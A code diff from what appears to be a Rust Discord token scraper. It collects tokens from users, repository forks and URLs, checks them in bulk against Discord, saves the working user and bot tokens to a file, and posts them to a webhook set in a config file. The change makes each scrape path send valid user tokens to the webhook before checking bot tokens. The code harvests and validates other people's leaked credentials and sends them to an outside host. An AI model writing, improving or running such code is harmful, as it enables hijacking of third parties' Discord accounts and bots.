@@ -109,18 +109,26 @@ async fn user_scrape(username: String) {
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "User", valid_users).await;
+        }
+    }
     let valid_bots = disc.mass_check_bot().await;
     println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-    write_file("valid.txt", "User Tokens:\n\n").await;
-    for token in valid_users.clone() {
-        write_file("valid.txt", &format!("{token}\n")).await;
-    }
+    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+
     write_file("valid.txt", "Bot Tokens:\n\n").await;
     for token in valid_bots.clone() {
         write_file("valid.txt", &format!("{token}\n")).await;
@@ -129,7 +137,6 @@ async fn user_scrape(username: String) {
     if let Ok(config) = config {
         if let Some(webhook) = config.webhook {
             let web = Webhook::new(&webhook);
-            web.send(&username, "User", valid_users).await;
             web.send(&username, "Bot", valid_bots).await;
         }
     }
@@ -152,36 +159,43 @@ async fn user_scrape_with_fork(username: String, max: Option<u32>) {
         }
         let disc = Discord::new(unchecked_tokens.clone());
         let valid_users = disc.mass_check_user().await;
-        println!("\x1b[0;34m
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-       \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
-        let valid_bots = disc.mass_check_bot().await;
-        println!("\x1b[0;34m
+    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "User", valid_users).await;
+        }
+    }
+    let valid_bots = disc.mass_check_bot().await;
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-       \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-        write_file("valid.txt", "User Tokens:\n\n").await;
-        for token in valid_users.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
+    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+
+    write_file("valid.txt", "Bot Tokens:\n\n").await;
+    for token in valid_bots.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "Bot", valid_bots).await;
         }
-        write_file("valid.txt", "Bot Tokens:\n\n").await;
-        for token in valid_bots.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
-        }
-        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
-        if let Ok(config) = config {
-            if let Some(webhook) = config.webhook {
-                let web = Webhook::new(&webhook);
-                web.send(&username, "User", valid_users).await;
-                web.send(&username, "Bot", valid_bots).await;
-            }
-        }
-        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
+    }
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
     } else {
         let mut unchecked_tokens = vec![];
         let mut count = 0;
@@ -196,36 +210,43 @@ async fn user_scrape_with_fork(username: String, max: Option<u32>) {
         }
         let disc = Discord::new(unchecked_tokens.clone());
         let valid_users = disc.mass_check_user().await;
-        println!("\x1b[0;34m
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-       \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
-        let valid_bots = disc.mass_check_bot().await;
-        println!("\x1b[0;34m
+    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "User", valid_users).await;
+        }
+    }
+    let valid_bots = disc.mass_check_bot().await;
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-       \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-        write_file("valid.txt", "User Tokens:\n\n").await;
-        for token in valid_users.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
+    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+
+    write_file("valid.txt", "Bot Tokens:\n\n").await;
+    for token in valid_bots.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "Bot", valid_bots).await;
         }
-        write_file("valid.txt", "Bot Tokens:\n\n").await;
-        for token in valid_bots.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
-        }
-        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
-        if let Ok(config) = config {
-            if let Some(webhook) = config.webhook {
-                let web = Webhook::new(&webhook);
-                web.send(&username, "User", valid_users).await;
-                web.send(&username, "Bot", valid_bots).await;
-            }
-        }
-        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
+    }
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
     }
 
 }
@@ -256,35 +277,43 @@ async fn auto_scrape(max: u32) {
         }
         let disc = Discord::new(unchecked_tokens.clone());
         let valid_users = disc.mass_check_user().await;
-        println!("\x1b[0;34m
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
     \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
-        let valid_bots = disc.mass_check_bot().await;
-        println!("\x1b[0;34m
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&url, "User", valid_users).await;
+        }
+    }
+    let valid_bots = disc.mass_check_bot().await;
+    println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
     \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-        write_file("valid.txt", "User Tokens:\n\n").await;
-        for token in valid_users.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
+
+    write_file("valid.txt", "Bot Tokens:\n\n").await;
+    for token in valid_bots.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&url, "Bot", valid_bots).await;
         }
-        write_file("valid.txt", "Bot Tokens:\n\n").await;
-        for token in valid_bots.clone() {
-            write_file("valid.txt", &format!("{token}\n")).await;
-        }
-        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
-        if let Ok(config) = config {
-            if let Some(webhook) = config.webhook {
-                let web = Webhook::new(&webhook);
-                web.send(&url, "User", valid_users).await;
-                web.send(&url, "Bot", valid_bots).await;
-            }
-        }
+    }
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
 
     }
 }
@@ -298,18 +327,26 @@ async fn check_tokens() {
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send("None", "User", valid_users).await;
+        }
+    }
     let valid_bots = disc.mass_check_bot().await;
     println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-    write_file("valid.txt", "User Tokens:\n\n").await;
-    for token in valid_users.clone() {
-        write_file("valid.txt", &format!("{token}\n")).await;
-    }
+    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+
     write_file("valid.txt", "Bot Tokens:\n\n").await;
     for token in valid_bots.clone() {
         write_file("valid.txt", &format!("{token}\n")).await;
@@ -318,7 +355,6 @@ async fn check_tokens() {
     if let Ok(config) = config {
         if let Some(webhook) = config.webhook {
             let web = Webhook::new(&webhook);
-            web.send("None", "User", valid_users).await;
             web.send("None", "Bot", valid_bots).await;
         }
     }
@@ -345,18 +381,26 @@ async fn scrape_url(url: &str, count: u32) {
 ║ Valid User Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(url, "User", valid_users).await;
+        }
+    }
     let valid_bots = disc.mass_check_bot().await;
     println!("\x1b[0;34m
 ╔════════════════════════╬
 ║ Valid Bot Tokens: {}
 ║ Total invalid: {}
 ╚════════════════════════╬
-   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
-    write_file("valid.txt", "User Tokens:\n\n").await;
-    for token in valid_users.clone() {
-        write_file("valid.txt", &format!("{token}\n")).await;
-    }
+    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+
     write_file("valid.txt", "Bot Tokens:\n\n").await;
     for token in valid_bots.clone() {
         write_file("valid.txt", &format!("{token}\n")).await;
@@ -365,7 +409,6 @@ async fn scrape_url(url: &str, count: u32) {
     if let Ok(config) = config {
         if let Some(webhook) = config.webhook {
             let web = Webhook::new(&webhook);
-            web.send(url, "User", valid_users).await;
             web.send(url, "Bot", valid_bots).await;
         }
     }
